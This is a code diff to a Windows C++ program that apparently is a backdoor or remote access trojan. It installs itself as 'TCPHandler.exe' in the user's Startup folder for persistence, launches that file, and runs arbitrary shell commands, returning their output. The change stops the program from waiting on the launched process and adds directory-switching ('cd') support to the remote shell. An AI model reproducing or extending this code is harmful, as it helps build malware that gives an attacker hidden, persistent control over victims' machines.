@@ -2,6 +2,7 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include "Utils.h"
+#include <string>
 
 std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";
 
@@ -58,13 +59,17 @@ void executeStartUpFile()
         &pi           // Pointer to PROCESS_INFORMATION structure
     ))
         return;
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    //WaitForSingleObject(pi.hProcess, INFINITE);
     // Close process and thread handles. 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
 
-std::string executeShell(char* cmd) {
+std::string executeShell(char* cmd) 
+{
+    std::string cd = std::string(cmd).substr(0, 2);
+    if (cd._Equal("cd"))
+        return switchDir((char*)std::string(cmd).substr(2).c_str());
     std::array<char, 128> buffer;
     std::string result;
     /*i create a pointer to a "file"*/
@@ -79,5 +84,36 @@ std::string executeShell(char* cmd) {
         result += buffer.data();
    
     return result;
+}
+
+std::string switchDir(char* arg)
+{
+    std::string subFolderPath;
+    WCHAR moduleFilePath[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, moduleFilePath);
+
+    char modulePath[MAX_PATH];
+    wcstombs(modulePath, moduleFilePath, MAX_PATH);
+
+    // Find the backslash in front of the name the last directory.
+    std::string::size_type pos = std::string(modulePath).find_last_of("\\");
+
+    if (!strcmp(arg, "..") || !strcmp(arg, " .."))
+        // Removing the last directory
+        subFolderPath = std::string(modulePath).substr(0, pos);
+
+    else
+        //adding the name of the folder
+        subFolderPath = std::string(modulePath) + "\\" + &arg[1];
+
+    WCHAR subPath[MAX_PATH];
+    mbstowcs(subPath, subFolderPath.c_str(), subFolderPath.size() + 1);
+
+    if (_wchdir(subPath))
+    {
+        std::cout << "Set dir error <" << GetLastError() << ">" << std::endl;
+        return "Error ";
+    }
+    return subFolderPath.c_str();
 }
 
